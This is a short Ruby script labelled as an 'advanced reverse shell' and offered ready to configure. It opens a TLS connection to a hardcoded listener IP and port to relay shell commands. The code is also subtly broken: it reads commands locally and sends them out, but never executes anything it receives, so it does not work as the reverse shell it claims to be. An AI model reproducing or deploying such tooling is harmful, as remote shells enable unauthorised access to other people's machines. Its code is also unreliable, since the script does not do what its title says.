#!/usr/bin/env ruby
# Ruby Advanced Reverse Shell
# Configure LHOST and LPORT before use

require 'socket'
require 'openssl'

LHOST = "192.168.1.100"
LPORT = 4445

begin
  context = OpenSSL::SSL::SSLContext.new
  context.ssl_version = :TLSv1_2

  socket = TCPSocket.new(LHOST, LPORT)
  ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, context)
  ssl_socket.connect

  loop do
    print "$ "
    command = gets.chomp
    break if command == "exit"

    ssl_socket.puts command
    response = ssl_socket.gets
    puts response unless response.nil?
  end

  ssl_socket.close
  socket.close
rescue => e
  puts "Error: #{e.message}"
end
